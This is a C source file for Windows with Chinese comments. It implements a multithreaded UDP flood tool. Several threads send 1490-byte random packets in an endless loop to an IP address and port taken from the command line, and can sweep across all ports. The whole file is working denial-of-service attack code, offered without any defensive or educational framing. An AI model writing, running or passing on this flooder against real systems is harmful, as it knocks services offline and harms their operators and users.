//
// Created by Alnnt on 2024/4/21.
//
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <stdbool.h>
#include <pthread.h>
#include "../usage.h"
#include "../environment.h"

#pragma comment(lib, "ws2_32.lib")

void *threadRunnable(void *tid);
_Noreturn void UdpFlood();

int main(int argc, char **argv) {
    ProcessCommandLine(argc, argv);
    pthread_t threads[THREAD_COUNT];
    int status, i;
    for (i = 0; i < THREAD_COUNT; i++) { //循环创建10个现场
        // 创建线程，线程函数传入参数为i
        status = pthread_create(&threads[i], NULL, threadRunnable, (void *) i);
        if (status != 0) { // 线程创建不成功
            printf("pthread_create returned error code %d\n", status);
            exit(1);
        }
    }
    // 等待线程执行完成
    for (i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    exit(0);
}

void *threadRunnable(void *tid) {
    printf("Thread start TID: %d\n", (int) tid);
    UdpFlood();
}

_Noreturn void UdpFlood() {
    WSADATA wsa;
    SOCKET sockfd;
    struct sockaddr_in dest_addr;

    unsigned char bytes[1490];

    // 初始化Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("WSAStartup failed\n");
        exit(1);
    }

    // 创建UDP连接
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == INVALID_SOCKET) {
        printf("socket creation failed\n");
        WSACleanup();
        exit(1);
    }

    // 准备目标地址
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;

    // 准备IP地址
    dest_addr.sin_addr.s_addr = inet_addr(ADDRESS_IP);
    dest_addr.sin_port = htons(ADDRESS_PORT);

    // 创建随机字节
    for (int i = 0; i < sizeof(bytes); ++i) {
        bytes[i] = rand() % 256;
    }

    unsigned int sentId = 0;
    // 是否遍历所有端口
    bool portAll = ADDRESS_PORT == NULL_PORT;
    while (1) {
        sendto(sockfd, (const char *) bytes, sizeof(bytes), 0, (const struct sockaddr *) &dest_addr, sizeof(dest_addr));
        if (portAll) {
            // port到达65535后自动溢出到0
            ++ADDRESS_PORT;
            dest_addr.sin_port = htons(ADDRESS_PORT);
        }
        if (LOG) {
            ++sentId;
            printf("Id:%d Address:%s Port:%d\n", sentId, inet_ntoa(dest_addr.sin_addr), ADDRESS_PORT);
        }
    }
}